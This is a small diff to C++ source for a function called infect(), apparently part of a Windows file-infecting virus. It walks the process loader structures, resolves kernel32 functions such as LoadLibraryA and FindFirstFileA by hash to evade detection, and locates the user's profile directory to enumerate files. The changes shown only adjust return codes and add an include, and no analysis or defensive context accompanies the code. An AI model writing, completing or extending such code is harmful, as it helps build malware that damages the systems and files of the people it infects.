@@ -3,6 +3,7 @@
 
 #include <windows.h>
 #include <winternl.h>
+#include <shlobj.h>
 
 typedef struct FULL_PEB_LDR_DATA
 {
@@ -132,7 +133,7 @@ int infect(void)
    }
 
    if (kernel32 == nullptr)
-      return;
+      return 1;
 
    LoadLibraryAHeader loadLibrary = reinterpret_cast<LoadLibraryAHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0x53b2070f));
    FindFirstFileAHeader findFirstFile = reinterpret_cast<FindFirstFileAHeader>(get_proc_by_hash(reinterpret_cast<PIMAGE_DOS_HEADER>(kernel32->DllBase), 0xd7482f55));
@@ -155,7 +156,7 @@ int infect(void)
 
    /* get profile directory from SHGetFolderPathA */
    if (getFolderPath(nullptr, CSIDL_PROFILE, nullptr, 0, profile_directory) != 0)
-      return 1;
+      return 2;
 
    char prepend_path[] = {'\\', '\\', '?', '\\', 0};
    std::size_t root_size = strlen(prepend_path)+strlen(profile_directory)+1;
